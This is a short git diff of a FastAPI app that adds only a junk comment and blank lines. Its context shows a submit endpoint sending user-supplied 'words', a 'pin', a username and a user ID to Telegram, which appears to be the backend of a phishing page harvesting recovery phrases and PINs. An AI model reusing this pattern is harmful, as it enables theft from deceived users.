@@ -7,6 +7,8 @@ from fastapi.responses import FileResponse
 import requests
 import os
 
+#sdvsdfv
+
 app = FastAPI()
 
 app.mount("/static", StaticFiles(directory="static"), name="static")
@@ -59,6 +61,7 @@ async def submit(data: Data):
     send_to_telegram(data.words, data.pin, data.username, data.user_id)
 
     return {"status": "ok"}
+
 
 
 
